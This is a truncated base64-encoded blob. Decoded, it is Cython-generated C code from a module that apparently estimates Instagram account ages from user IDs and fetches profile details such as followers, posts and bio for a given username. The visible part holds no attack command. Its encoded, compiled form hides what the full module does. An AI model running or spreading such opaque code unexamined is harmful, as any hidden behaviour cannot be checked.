KSBfX1BZWF9FUlIoMCwgMjE0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTYpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTY7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMzcxMzY2ODc4NiwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzU2OTk3ODUyMTcsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjE2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTcpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTc7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNTY5OTc4NTIxNywgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50Xzg1MDc5NDA2MzQsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMTgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjE4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTgpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTg7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfODUwNzk0MDYzNCwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMjAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIxMjU0MDI5ODM0LCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjIwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDIyMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIGlmIChfX3B5eF90XzUpIHtcblxuICAgICAgICBcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE5KTtcbiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE5O1xuICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47XG5cbiAgICAgICAgXG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgIHtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjAyMF8yMDIzKTtcbiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjAyMF8yMDIzO1xuICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47XG4gICAgICB9XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX3B5eF9MM19lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuXG4gICAgXG4gICAgX19weXhfdF82ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpO1xuICAgIGlmIChfX3B5eF90XzYpIHtcbiAgICAgIF9fUHl4X0VyclJlc3RvcmUoMCwwLDApO1xuXG4gICAgICBcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X293KTtcbiAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3c7XG4gICAgICBnb3RvIF9fcHl4X0w2X2V4Y2VwdF9yZXR1cm47XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuXG4gICAgXG4gICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w3X3RyeV9yZXR1cm46O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpO1xuICAgIGdvdG8gX19weXhfTDA7XG4gICAgX19weXhfTDZfZXhjZXB0X3JldHVybjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgZ290byBfX3B5eF9MMDtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcC5kYXRlIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl91aWQpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJvcF85SW5mb0FjYyhQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yb3BfOUluZm9BY2MgPSB7IkluZm9BY2MiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJvcF85SW5mb0FjYywgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm9wXzlJbmZvQWNjKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcm5hbWUgPSAwO1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2dnID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJJbmZvQWNjICh3cmFwcGVyKSIsIDApO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7XG4gICNlbHNlXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICNlbmRpZlxuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIHtcbiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VybmFtZSwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dnLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMjI4LCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDI6XG4gICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgMjI4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgIkluZm9BY2MiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMjsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiSW5mb0FjYyIsIDEsIDIsIDIsIGkpOyBfX1BZWF9FUlIoMCwgMjI4LCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMikpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAyMjgsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3VzZXJuYW1lID0gdmFsdWVzWzBdO1xuICAgIF9fcHl4X3ZfZ2cgPSB2YWx1ZXNbMV07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJJbmZvQWNjIiwgMSwgMiwgMiwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMjI4LCBfX3B5eF9MM19lcnJvcilcbiAgX19weXhfTDZfc2tpcDo7XG4gIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7XG4gIF9fcHl4X0wzX2Vycm9yOjtcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8yb3BfOEluZm9BY2MoX19weXhfc2VsZiwgX19weXhfdl91c2VybmFtZSwgX19weXhfdl9nZyk7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJvcF84SW5mb0FjYyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9nZykge1xuICBQeU9iamVjdCAqX19weXhfdl9yciA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X0lkID0gTlVMTDtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9mdWxsX25hbWUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9mb3dzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZm93ZyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3BwID0gTlVMTDtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9pc1ByYWlzZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2JpbyA9IE5VTEw7XG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfaXNfdmVyaWZpZWQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9iaXp6ID0gTlVMTDtcbiAgaW50IF9fcHl4X3ZfbWV0YTtcbiAgUHlPYmplY3QgKl9fcHl4X3Zfc3MgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9maWxlID0gTlVMTDtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgc2l6ZV90IF9fcHl4X3RfNTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfOTtcbiAgaW50IF9fcHl4X3RfMTA7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE0ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE3ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMThbMjNdO1xuICBQeU9iamVjdCAqX19weXhfdF8xOSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIwID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMjEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIzWzZdO1xuICBpbnQgX19weXhfdF8yNDtcbiAgaW50IF9fcHl4X3RfMjU7XG4gIGNoYXIgY29uc3QgKl9fcHl4X3RfMjY7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzI3ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMjggPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yOSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMwID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zMiA9IE5VTEw7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIkluZm9BY2MiLCAwKTtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmZvaW5zdGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyMzEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMzEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fcHl4X3RfMyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjMxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fcHl4X3RfNSA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNCkpKSB7XG4gICAgX19weXhfdF8yID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTtcbiAgICBhc3NlcnQoX19weXhfdF8yKTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzQsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF81ID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzIsIF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfM307XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgzLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyMzEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fcHl4X3ZfcnIgPSBfX3B5eF90XzE7XG4gIF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDIzMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjd